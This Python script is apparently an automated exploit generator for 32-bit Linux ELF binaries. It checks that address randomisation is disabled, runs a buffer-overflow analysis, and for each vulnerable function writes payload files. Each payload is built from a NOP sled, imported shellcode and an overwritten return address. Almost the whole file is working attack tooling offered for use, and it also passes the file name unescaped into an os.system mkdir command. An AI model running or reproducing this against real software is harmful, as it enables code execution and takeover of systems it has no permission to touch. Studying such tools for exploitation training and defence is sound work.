#!/usr/bin/python3 -tt
import sys
import ealib
from ealib import pout
import os
from elf2json import elf2json
from PXinteract import interact
from shutil import which
from shellcodes import SHELLCODES
import binascii

def main():

	#check requirements such starce etc
	dependency_unmet=False
	if not which("strace"):
		pout(2,"strace : not found - please install")
		dependency_unmet=True
	if not which("gdb"):
		pout(2,"gdb : not found - please install")
		dependency_unmet=True
	if not which("objdump"):
		pout(2,"objdump : not found - please install")
		dependency_unmet=True
	if not which("gcc"):
		pout(2,"gcc : not found - please install")
		dependency_unmet=True
	#uncomment this
	if interact("cat /proc/sys/kernel/randomize_va_space")[0].strip("\n") != '0':
		pout(2,"randomize_va_space is not 0")
		dependency_unmet=True

	if dependency_unmet:
		exit()

	#check if command line input is passed
	if len(sys.argv) < 2:
		print(sys.argv[0],"<elf_file>")
		exit()
		
		
	elf_bin=sys.argv[1]
	#check if file exists
	if not os.path.isfile(elf_bin):
		print("No such file : "+elf_bin)
		exit()


	#check if file is elf 32 i386 bit binary
	op=interact("file "+elf_bin)[0]
	if op.find("ELF 32-bit") == -1:
		pout(2,elf_bin+" is not a 32 bit ELF, should be a 32 bit ELF.")
		exit()


	elf_bin_sz=os.stat(elf_bin).st_size

	cont=True
	if elf_bin_sz > 99999:
		cont=False
		print(elf_bin+" : "+str(elf_bin_sz))
		inp=input("File too big, want to continue ? ")
		if inp in ['y','Y','yes','YES','true','1']:
			cont=True

	if not cont:
		exit()
	
	
	ealib.print_banner()

	pout(0,"Cleaning temp files")
	ealib.clean_temp()
	pout(1,"temp files cleaned\n")

	pout(0,"Creating JSON object for : "+elf_bin)
	elf_obj=elf2json(elf_bin)
	pout(1,"JSON object created\n")
	pout(0,"Guessing PIE memory offset as compared to static memory addressess")
	mem_offset=ealib.guess_mem_offset(elf_bin,elf_obj)
	pout(1,"Start address : "+elf_obj['start_addr'])
	pout(1,"Memory Offset : "+mem_offset+"\n")

	
	pout(0,"Fetching user defined functions in binary")
	funcs_list=ealib.find_all_func(elf_obj)
	if len(funcs_list) == 0:
		pout(2,"Failed to fetch user defined functions.")
		exit()
	print(funcs_list)
	print()

	pout(0,"Finding number of stdin(s)")
	n_stdin=ealib.count_stdin(elf_bin)
	print("stdin(s) : "+str(n_stdin)+"\n")
	

	pout(0,"Fetching binary's call flow")
	func_flow=ealib.func_call_flow(elf_bin,elf_obj,funcs_list,n_stdin)[1]
	print(func_flow)
	print()

	pout(0,"Analysing binary for buffer overflow")

	vuln_list=ealib.bof_analysis(elf_bin,elf_obj,mem_offset,func_flow,n_stdin)
	print()
	pout(1,"bof analysis completed\n\n")
	
	vulnearable=False
	for vuln_dict in vuln_list:
		if vuln_dict['ret_addr']:
			vulnearable=True
			pout(1," VULNERABLE : "+vuln_dict['func']+"() - with buffer len "+str(vuln_dict['shell_len'])+" @ stack address "+vuln_dict['ret_addr'])
	print()

	if vulnearable:
		#find gdb vs non-gdb memory layout difference

		stack_mem_diff=ealib.find_gdb_mem_diff()
		if stack_mem_diff == None:
			stack_mem_diff=0
		pout(0,"Generating shellcode(s) for vulnerable programme")

		for vuln_dict in vuln_list:
			if vuln_dict['ret_addr']:
				for key,shellc in SHELLCODES.items():
					
					nop_len=vuln_dict['shell_len']-len(shellc)-4
					if nop_len > 0:
						shellcode_path="shells_"+elf_bin.split("/")[-1]
						os.system("mkdir "+shellcode_path+" > /dev/null 2>&1")
						inp_file=open(shellcode_path+"/shellcode_"+key,"wb")

						print("Creating shellcode : "+shellcode_path+"/shellcode_"+key)

						#generating shellcode to be executed
						
						for i in range(vuln_dict['nth_input']):
							if i == (vuln_dict['nth_input'] -1):
								ret_addr=vuln_dict['ret_addr']
								ret_addr=hex(int(ret_addr,16)+stack_mem_diff)
								ret_addr=hex(int(ret_addr,16)+2) 		#adding 2 bytes ie eip will print 2 nop sled ahead...
								ret_addr=ret_addr.strip("0xX")
								ret_addr=ret_addr.zfill(8)
								#ret_addr_str="\x"+ret_addr[0:2]+"\x"+ret_addr[2:4]+"\x"+ret_addr[4:6]+"\x"+ret_addr[6:8]
								#print(ret_addr_str)
								inp_file.write(b"\x90"*nop_len+shellc)
								inp_file.write(binascii.unhexlify(ret_addr[6:8]))
								inp_file.write(binascii.unhexlify(ret_addr[4:6]))
								inp_file.write(binascii.unhexlify(ret_addr[2:4]))
								inp_file.write(binascii.unhexlify(ret_addr[0:2]))
							else:
								inp_file.write("X"+"\n")
						inp_file.close()

	else:
		pout(2,"Not vulnerable to buffer overflow")



if __name__ == '__main__':
	main()